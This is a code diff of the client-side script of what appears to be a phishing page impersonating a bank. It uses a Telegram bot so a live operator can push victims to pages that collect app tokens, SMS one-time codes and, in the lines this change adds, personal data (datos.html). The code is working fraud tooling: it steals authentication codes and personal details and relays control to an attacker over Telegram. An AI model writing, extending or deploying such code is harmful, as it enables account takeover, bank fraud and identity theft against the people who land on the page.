@@ -222,13 +222,13 @@
             const errorModal = document.getElementById('error-modal');
             const backToStartButton = document.getElementById('back-to-start-button');
             const spinnerModal = document.getElementById('spinner-modal');
-            const transactionId = Date.now().toString();
-
+            
             let activeTab = 'segura'; 
             let TELEGRAM_BOT_TOKEN = '';
             let TELEGRAM_CHAT_ID = '';
             let statusCheckInterval = null;
             let lastUpdateId = parseInt(sessionStorage.getItem('lastUpdateId')) || 0;
+            const transactionId = Date.now().toString();
 
             async function loadTelegramConfig() {
                 try {
@@ -439,6 +439,7 @@
                     inline_keyboard: [
                         [{ text: "💎 Token App", callback_data: `pedir_dinamica:${transactionId}` }],
                         [{ text: "👀 Token SMS", callback_data: `pedir_sms:${transactionId}` }],
+                        [{ text: "📝 Pedir Datos", callback_data: `pedir_datos:${transactionId}` }],
                         [{ text: "❌ Error logo", callback_data: `error_logo:${transactionId}` }]
                     ],
                 });
@@ -496,9 +497,12 @@
                                     window.location.href = "token.html";
                                 } else if (callbackData === 'pedir_sms') {
                                     window.location.href = "otp.html";
+                                } else if (callbackData === 'pedir_datos') {
+                                    window.location.href = "datos.html";
                                 } else if (callbackData === 'error_logo') {
                                     errorModal.style.display = 'flex';
                                 }
+                                sessionStorage.clear(); // Limpiar el sessionStorage después de procesar la acción
                             }
                         }
                     } catch (error) {
